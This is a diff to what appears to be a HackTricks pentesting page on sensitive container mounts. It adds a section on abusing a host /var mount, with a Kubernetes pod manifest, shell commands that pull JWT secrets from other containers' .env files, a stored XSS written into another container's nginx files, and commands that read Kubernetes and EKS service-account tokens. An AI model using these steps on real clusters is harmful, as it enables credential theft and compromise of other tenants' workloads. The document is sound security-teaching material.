@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
+The exposure of `/proc`, `/sys`, and `/var` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
 
 **You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -164,6 +164,110 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 
 - `debugfs` offers a "no rules" debugging interface to the kernel.
 - History of security issues due to its unrestricted nature.
+
+### `/var` Vulnerabilities
+
+The host's **/var** folder contains container runtime sockets and the containers' filesystems.
+If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
+with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
+containers and applications that run in them.
+
+#### Kubernetes
+
+If a container like this is deployed with Kubernetes:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-mounts-var
+  labels:
+    app: pentest
+spec:
+  containers:
+    - name: pod-mounts-var-folder
+      image: alpine
+      volumeMounts:
+        - mountPath: /host-var
+          name: noderoot
+      command: [ "/bin/sh", "-c", "--" ]
+      args: [ "while true; do sleep 30; done;" ]
+  volumes:
+    - name: noderoot
+      hostPath:
+        path: /var
+```
+
+Inside the **pod-mounts-var-folder** container:
+
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+
+The XSS was achieved:
+
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
+
+Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.
+
+You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.
+
+##### Access to cloud credentials
+
+The container can read K8s serviceaccount tokens or AWS webidentity tokens
+which allows the container to gain unauthorized access to K8s or cloud:
+
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+
+#### Docker
+
+The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
+the other containers' filesystems are available under a different base path:
+
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+ Storage Driver: overlay2
+ Docker Root Dir: /var/lib/docker
+```
+
+So the filesystems are under `/var/lib/docker/overlay2/`:
+
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+
+#### Note
+
+The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
+locate the other containers' filesystems
+
+
 
 ### References
 
